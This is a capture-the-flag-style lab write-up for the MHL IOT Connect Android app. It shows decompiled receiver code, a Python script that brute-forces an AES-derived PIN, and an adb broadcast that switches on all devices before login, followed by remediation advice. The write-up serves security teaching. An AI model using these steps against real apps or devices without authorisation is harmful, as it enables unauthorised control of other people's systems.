---
title: "MHL IOT Connect Writeup"
date: 2026-10-20
categories: [Mobile Hacking, Android]
tags: [android, mobile-hacking-lab, broadcast-receiver, exported-component, reverse-engineering, brute-force, adb]
---

## 1. Objective

The objective of this lab was to exploit a broadcast receiver vulnerability in the IOT Connect Android application to activate the master switch without authenticating as a user.

The application contains a broadcast receiver that listens for the `MASTER_ON` action. When the supplied key passes validation, the application invokes a method that turns on all connected devices.

The investigation involved:

- Analyzing the Android manifest.
- Identifying the broadcast receiver and its action.
- Reverse-engineering the key validation logic.
- Recovering the valid PIN through offline analysis.
- Sending a broadcast using Android Debug Bridge (ADB).
- Verifying the result on the Android device.

## 2. Initial Reconnaissance: AndroidManifest.xml

The first step was to inspect the application's manifest.

**Command:**

```
cat resources/AndroidManifest.xml
```

### Explanation

- `cat` prints a file's contents to the terminal.
- `resources/AndroidManifest.xml` is the decoded Android manifest.

The manifest describes the application's components, permissions, SDK compatibility, and which components can be accessed by other applications.

### Important findings

#### Application package

```
package="com.mobilehackinglab.iotconnect"
```

This identifies the application package. It is used later when targeting the application through ADB.

#### Debuggable application

```
android:debuggable="true"
```

The application is marked as debuggable. This can facilitate debugging and testing, although it is not itself the cause of the vulnerability.

#### Exported broadcast receiver

```
<receiver
    android:name="com.mobilehackinglab.iotconnect.MasterReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="MASTER_ON"/>
    </intent-filter>
</receiver>
```

The manifest declares a receiver named `MasterReceiver` that is enabled, exported, and associated with the `MASTER_ON` action.

The `android:exported="true"` attribute means the component can be invoked by eligible external applications, subject to applicable permissions and platform restrictions.

This was the first indication of a potential attack surface: an externally accessible component associated with an action that controls connected devices.

However, the manifest alone does not establish whether this receiver performs the sensitive operation or validates the caller.

## 3. Locate the Receiver Implementation

The next step was to search the decompiled source for references to `MasterReceiver`.

**Commands:**

```
grep -r MasterReceiver .
grep -ri MasterReceiver .
```

### Explanation

- `grep` searches text for a specified pattern.
- `-r` searches recursively through directories.
- `-i` makes the search case-insensitive.
- `.` represents the current working directory.

The results identified references in the manifest and `CommunicationManager.java`, where an anonymous broadcast receiver is created and registered.

To search for a corresponding source file, the following command was used:

```
find sources -iname '*MasterReceiver*'
```

### Result

The command returned no results.

This means the expected standalone `MasterReceiver.java` file was not present in the decompiled source tree. It does not prove the class is absent from the APK; decompilation can be incomplete, so the original DEX files would need further inspection to establish that.

The more promising lead was the receiver implementation in `CommunicationManager.java`.

## 4. Analyze CommunicationManager.java

**Command:**

```
cat sources/com/mobilehackinglab/iotconnect/CommunicationManager.java
```

The relevant code was:

```
public final BroadcastReceiver initialize(Context context) {
    masterReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context2, Intent intent) {
            if (Intrinsics.areEqual(
                    intent != null ? intent.getAction() : null,
                    "MASTER_ON")) {

                int key = intent.getIntExtra("key", 0);

                if (context2 != null) {
                    if (Checker.INSTANCE.check_key(key)) {
                        CommunicationManager.INSTANCE
                            .turnOnAllDevices(context2);

                        Toast.makeText(
                            context2,
                            "All devices are turned on",
                            1
                        ).show();
                    } else {
                        Toast.makeText(
                            context2,
                            "Wrong PIN!!",
                            1
                        ).show();
                    }
                }
            }
        }
    };

    context.registerReceiver(
        masterReceiver,
        new IntentFilter("MASTER_ON")
    );

    return masterReceiver;
}
```

This is the central part of the investigation.

### 4.1 The receiver listens for MASTER_ON

```
new IntentFilter("MASTER_ON")
```

An `IntentFilter` specifies the broadcast actions a receiver is interested in. Here, the receiver listens for the action `MASTER_ON`.

When an appropriate broadcast reaches the registered receiver, Android invokes its `onReceive()` method.

### 4.2 The key is extracted from the intent

```
int key = intent.getIntExtra("key", 0);
```

This retrieves an integer extra named `key` from the incoming intent.

The second argument, `0`, is the default value if the extra is missing.

This identifies the input required for the key-validation function.

### 4.3 The key is validated

```
if (Checker.INSTANCE.check_key(key))
```

The receiver passes the supplied integer to `Checker.check_key()`.

If the function returns `true`, the application invokes `turnOnAllDevices()`. Otherwise, it displays `Wrong PIN!!`.

This led to the next step: examining `Checker.java`.

### 4.4 The master-switch operation

```
CommunicationManager.INSTANCE.turnOnAllDevices(context2);
```

The implementation of `turnOnAllDevices()` updates shared preferences for several device categories, including fans, air conditioning, plugs, speakers, televisions, and bulbs.

The helper method writes the state as a Boolean:

```
SharedPreferences.Editor editor = sharedPreferences.edit();
editor.putBoolean(stateKey, defaultState);
editor.apply();
```

Each call supplies `true` as the desired state.

This establishes that the master-switch operation sets the application's device-state preferences to on. It does not independently prove that physical IoT hardware was activated.

## 5. Reverse-Engineer Checker.java

After identifying the key-validation function, the next command was:

```
cat sources/defpackage/Checker.java
```

The relevant code was:

```
private static final String algorithm = "AES";
private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";

public final boolean check_key(int key) {
    try {
        return Intrinsics.areEqual(
            decrypt(ds, key),
            "master_on"
        );
    } catch (BadPaddingException e) {
        return false;
    }
}
```

The function decrypts a fixed ciphertext and compares the plaintext against `master_on`.

### 5.1 Identify the encryption algorithm

The decompiled code specifies:

```
Cipher cipher = Cipher.getInstance(
    algorithm + "/ECB/PKCS5Padding"
);
```

Because `algorithm` is `AES`, the full transformation is:

```
AES/ECB/PKCS5Padding
```

The ciphertext is stored as a Base64-encoded string:

```
private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";
```

The application decodes this value, decrypts it using a key generated from the supplied integer, and checks whether the plaintext equals `master_on`.

### 5.2 Understand key generation

The key-generation method is:

```
private final SecretKeySpec generateKey(int staticKey) {
    byte[] keyBytes = new byte[16];

    byte[] staticKeyBytes =
        String.valueOf(staticKey).getBytes(Charsets.UTF_8);

    System.arraycopy(
        staticKeyBytes,
        0,
        keyBytes,
        0,
        Math.min(staticKeyBytes.length, keyBytes.length)
    );

    return new SecretKeySpec(keyBytes, algorithm);
}
```

The method performs the following operations:

1. Converts the supplied integer to a string.
2. Encodes the string as UTF-8 bytes.
3. Copies those bytes into a 16-byte array.
4. Leaves unused bytes zero-filled.
5. Creates an AES key from that array.

For example, the integer `345` becomes the bytes representing the characters `3`, `4`, and `5`, followed by zero bytes.

The algorithm and ciphertext are embedded in the APK, allowing the validation logic to be reverse-engineered offline.

## 6. Recover the PIN Using Python

Instead of manually testing candidate integers in the Android application, the validation function can be reproduced locally.

The following script was used:

```
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

ds = base64.b64decode("OSnaALIWUkpOziVAMycaZQ==")

for key in range(10000):
    aes_key = str(key).encode().ljust(16, b"\x00")
    try:
        plaintext = unpad(
            AES.new(aes_key, AES.MODE_ECB).decrypt(ds), 16
        )
        if plaintext == b"master_on":
            print(f"Found key: {key}")
            break
    except ValueError:
        pass
```

### 6.1 Import the libraries

```
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
```

- `base64` decodes the ciphertext.
- `AES` provides the AES cipher implementation.
- `unpad` removes the padding applied to the plaintext.

### 6.2 Decode the ciphertext

```
ds = base64.b64decode("OSnaALIWUkpOziVAMycaZQ==")
```

This converts the Base64 string from `Checker.java` into ciphertext bytes.

### 6.3 Enumerate candidate PINs

```
for key in range(10000):
```

This tests integers from `0` through `9999`.

The range is an initial search space, not a guarantee that the PIN must contain four digits.

### 6.4 Reproduce the application's key generation

```
aes_key = str(key).encode().ljust(16, b"\x00")
```

This converts each candidate integer to bytes and pads the result with zero bytes to a length of 16.

That reproduces the application's key-generation behavior for the tested non-negative integers.

### 6.5 Decrypt the ciphertext

```
plaintext = unpad(
    AES.new(aes_key, AES.MODE_ECB).decrypt(ds), 16
)
```

The script creates an AES cipher in ECB mode, decrypts the ciphertext, and removes the padding.

### 6.6 Check the expected plaintext

```
if plaintext == b"master_on":
    print(f"Found key: {key}")
    break
```

The candidate is accepted only when the decrypted plaintext matches the exact byte string `master_on`.

### 6.7 Handle invalid candidates

```
except ValueError:
    pass
```

Most candidate keys will not produce valid padding. The exception is handled so the search can continue.

### Result

Running the script produced:

```
Found key: 345
```

The integer `345` therefore satisfies the application's validation function.

This result was obtained by reproducing the algorithm and ciphertext from the APK, without modifying the application.

## 7. Determine When the Receiver Is Registered

Recovering the PIN explained the validation mechanism, but it was also necessary to establish whether the receiver could be reached before authentication.

The source was searched for calls to `CommunicationManager.initialize()`.

**Command:**

```
grep -R -n 'CommunicationManager.INSTANCE.initialize' sources/
```

### Explanation

- `grep` searches source files for a string.
- `-R` searches recursively.
- `-n` prints matching line numbers.
- The quoted string identifies the initialization method.
- `sources/` is the directory being searched.

### Results

```
sources/com/mobilehackinglab/iotconnect/LoginActivity.java:77:
    CommunicationManager.INSTANCE.initialize(this);

sources/com/mobilehackinglab/iotconnect/HomeActivity.java:37:
    CommunicationManager.INSTANCE.initialize(this);

sources/com/mobilehackinglab/iotconnect/MasterSwitchActivity.java:40:
    CommunicationManager.INSTANCE.initialize(this);
```

The important result was the call in `LoginActivity.java`.

### 7.1 Inspect LoginActivity.java

**Command:**

```
sed -n '45,100p' sources/com/mobilehackinglab/iotconnect/LoginActivity.java
```

`sed` prints selected lines from a file:

- `-n` suppresses automatic printing.
- `45,100p` prints lines 45 through 100.
- The final argument specifies the source file.

The relevant excerpt was:

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_login);

    // Database and login UI initialization omitted

    CommunicationManager.INSTANCE.initialize(this);

    // Login and signup click listeners configured afterward
}
```

Android invokes `onCreate()` when the activity is created. In this case, receiver initialization occurs during that lifecycle method, before the login button is clicked.

This establishes that the dynamic receiver is registered before the user completes the login flow.

The receiver checks the supplied PIN but does not perform a user-session or authentication check in the code examined.

## 8. Send the Broadcast Using ADB

With the PIN recovered and the action identified, the next step was to send a broadcast from Kali to the Android device.

**Command:**

```
adb shell am broadcast \
  -a MASTER_ON \
  --ei key 345 \
  -p com.mobilehackinglab.iotconnect
```

### Explanation of each argument

| Argument                             | Meaning                                                    |
| ------------------------------------ | ---------------------------------------------------------- |
| `adb`                                | Android Debug Bridge, used to communicate with the device. |
| `shell`                              | Executes a command in the Android device's shell.          |
| `am`                                 | Invokes Android's Activity Manager command-line interface. |
| `broadcast`                          | Sends a broadcast intent.                                  |
| `-a MASTER_ON`                       | Sets the intent action to `MASTER_ON`.                     |
| `--ei key 345`                       | Adds an integer extra named `key` with value `345`.        |
| `-p com.mobilehackinglab.iotconnect` | Restricts intent resolution to the specified package.      |

The backslash (`\`) at the end of each continued line tells the Kali shell that the command continues on the next line.

The `-p` argument specifies the package rather than an individual receiver class. This is important because the receiver of interest is dynamically registered.

### 8.1 Initial ADB output

The command returned:

```
Broadcasting: Intent {
    act=MASTER_ON
    flg=0x400000
    pkg=com.mobilehackinglab.iotconnect
    (has extras)
}
Broadcast completed: result=0
```

This shows that Android accepted and completed the broadcast operation.

However, `result=0` alone does not prove that the master-switch operation succeeded. The application's response needed to be observed separately.

## 9. Verify the Exploit on the Android Device

After launching the application and sending the broadcast, a screenshot showed the toast:

```
All devices are turned on
```

This message comes from the successful branch in `CommunicationManager.initialize()`:

```
if (Checker.INSTANCE.check_key(key)) {
    CommunicationManager.INSTANCE.turnOnAllDevices(context2);

    Toast.makeText(
        context2,
        "All devices are turned on",
        1
    ).show();
}
```

The toast is stronger evidence than the ADB result code alone. It demonstrates that the receiver reached the branch that invokes `turnOnAllDevices()` and displays the success message.

The screenshot also showed an Android dialog indicating that the application had stopped responding or crashed. This should be recorded separately: the success toast establishes that the operation was invoked, but does not prove that every device UI updated correctly or that physical IoT hardware was activated.

For a complete test, reopen the application and inspect the individual device states.

## 10. Attack Flow

The findings can be summarized as follows:

1. The manifest revealed an exported receiver associated with `MASTER_ON`.
2. Source searches identified the dynamic receiver in `CommunicationManager.java`.
3. The receiver extracted an integer named `key` and passed it to `Checker.check_key()`.
4. `Checker.java` revealed the embedded AES ciphertext and key-generation logic.
5. An offline Python script recovered the valid integer, `345`.
6. Source searches showed that `LoginActivity.onCreate()` registers the receiver before login.
7. ADB sent `MASTER_ON` with the integer extra `key=345`.
8. The application displayed `All devices are turned on`, confirming that the master-switch operation was invoked.

The primary vulnerability is a missing authorization boundary around a sensitive broadcast action. The application relies on a recoverable client-side PIN rather than enforcing authorization based on an authenticated user.

The exported `MasterReceiver` declaration is an additional potential entry point, but its implementation was not recovered in the provided source. The successful test is explained by the dynamically registered receiver and does not require assumptions about the missing class.

## 11. Security Impact

| Finding                            | Evidence                                                     | Impact                                                       |
| ---------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| Receiver registered before login   | `LoginActivity.onCreate()` calls `initialize(this)`          | Broadcast handling is available before successful login.     |
| Recoverable embedded secret        | `Checker.java` contains the ciphertext and key-generation logic | The PIN can be recovered through reverse engineering.        |
| Missing authentication enforcement | `onReceive()` checks the PIN but does not check a user session | A guest who knows the PIN can invoke the sensitive operation. |
| Exported receiver declaration      | Manifest specifies `android:exported="true"`                 | Potential additional external entry point requiring further investigation. |

## 12. Remediation

### 12.1 Enforce authorization

Verify that the caller is authorized to control the devices. Moving receiver initialization until after login is not sufficient by itself; the sensitive operation must enforce authorization as well.

### 12.2 Remove the embedded PIN as an authorization mechanism

A secret embedded in an APK can be recovered through reverse engineering. The application should not treat knowledge of that secret as proof of user identity.

### 12.3 Restrict external broadcast access

If external callers do not need this capability, avoid exporting the receiver. If access is required, enforce an appropriate permission and validate authorization independently.

### 12.4 Validate the authenticated session

Ensure the operation cannot be performed by a guest or a logged-out user.

### 12.5 Retest the fix

Repeat the broadcast test before and after login, using incorrect and correct keys and testing from unauthorized callers. Confirm that unauthorized requests are rejected and that legitimate authenticated use still works.

## 13. Conclusion

The IOT Connect challenge demonstrated an Android broadcast-receiver authorization flaw.

The investigation began with the manifest, identified the `MASTER_ON` action, traced its handling to `CommunicationManager.java`, and reverse-engineered `Checker.java` to understand the AES-based key validation. A Python script recovered the valid integer, `345`, and an ADB broadcast supplied that value to the application.

Finally, the on-device toast confirmed that the receiver reached the master-switch operation while the application was on the login screen.

The key lesson is that **a secret embedded in an Android application is not a reliable authorization mechanism**. Sensitive operations must enforce authorization independently of client-side secrets and must not be accessible to unauthenticated users.







## 14. Personal Learning Notes: Recognizing Android Broadcast Vulnerabilities

### The key lesson

**A valid input is not the same as an authorized user.**

In this challenge, the application accepted a broadcast if its `key` extra passed a PIN check. It did not check whether the sender had authenticated.

The attack succeeded because three weaknesses combined:

1. `LoginActivity.onCreate()` registered the receiver before authentication.
2. The receiver trusted an intent containing a valid integer key.
3. The key-validation mechanism could be reverse-engineered from the APK.

### Vulnerable code pattern

```
// Registered while the login screen is created
CommunicationManager.INSTANCE.initialize(this);
// Inside the broadcast receiver
int key = intent.getIntExtra("key", 0);

if (Checker.INSTANCE.check_key(key)) {
    CommunicationManager.INSTANCE.turnOnAllDevices(context);
}
```

The first line establishes when the receiver becomes available. The second block establishes what a caller must supply to trigger the operation.

When reviewing similar code, ask:

- Can the receiver be reached before login?
- Can another application send the relevant intent?
- Does the receiver trust caller-supplied extras?
- Is a hardcoded PIN or secret being used as the only check?
- Does the sensitive operation independently enforce authorization?

### What I learned about reverse engineering

I followed the code from the receiver to the validation function and then into the decryption and key-generation methods:

`onReceive()` → `check_key()` → `decrypt()` → `generateKey()`

This revealed that the PIN was not an unknown server-side secret. The application contained the ciphertext and the logic needed to validate candidate integers.

I reproduced that logic in Python and recovered the value `345`. This was more efficient than manually guessing values through the Android interface.

**Lesson:** When you find a validation function, inspect its implementation and dependencies. Do not assume a function is secure because its name suggests that it checks a key or PIN.

### What I learned about Android components

The manifest declared an exported `MasterReceiver`, but I could not locate a matching standalone Java file in the decompiled sources. Meanwhile, `CommunicationManager` registered an anonymous receiver dynamically.

The dynamic receiver was enough to explain the successful test, so I did not need to assume that the missing class was responsible.

**Lesson:** Distinguish statically declared components from dynamically registered receivers. If a component is missing from the decompiled source, inspect the DEX files or cross-reference the manifest instead of assuming its behavior.

### What I learned about testing

The ADB command was:

```
adb shell am broadcast \
  -a MASTER_ON \
  --ei key 345 \
  -p com.mobilehackinglab.iotconnect
```

The `-a` option sets the action, `--ei` supplies an integer extra, and `-p` restricts intent resolution to the package.

The initial `Broadcast completed: result=0` output did not prove that the operation succeeded. The on-device toast, `All devices are turned on`, provided stronger evidence that the successful branch was reached.

The application also displayed a crash-related dialog, so the toast alone did not prove that every device UI updated or that physical hardware was activated.

**Lesson:** Separate command execution from security-impact verification. Use observable application behavior and, where possible, inspect the resulting state.

### Reusable investigation checklist

For future Android security assessments:

1. Inspect the manifest for exported components, permissions, and intent filters.
2. Search the source for `registerReceiver()`, `onReceive()`, and relevant actions.
3. Find where receivers are initialized and determine whether initialization occurs before authentication.
4. Trace caller-controlled intent extras into validation functions.
5. Inspect hardcoded constants, cryptographic operations, and key-generation routines.
6. Follow successful validation branches into sensitive operations.
7. Test whether the operation can be triggered without an authenticated session.
8. Record the command, observed result, and limitations of the evidence.
9. Recommend authorization checks at the sensitive operation, rather than relying on a client-side secret.

### Remediation principle

The application should verify that the caller is authorized to perform the operation. A hardcoded PIN embedded in an APK must not be treated as proof of identity. External broadcast access should also be restricted where appropriate.

Moving receiver registration until after login can reduce exposure, but it is not a complete fix by itself. Authorization must still be enforced when the sensitive operation is invoked.

**Final takeaway:** Whenever an Android component accepts an intent and performs a sensitive action, trace the entire path from the entry point to the operation. Identify who can invoke it, what input controls it, and where authentication and authorization are actually enforced.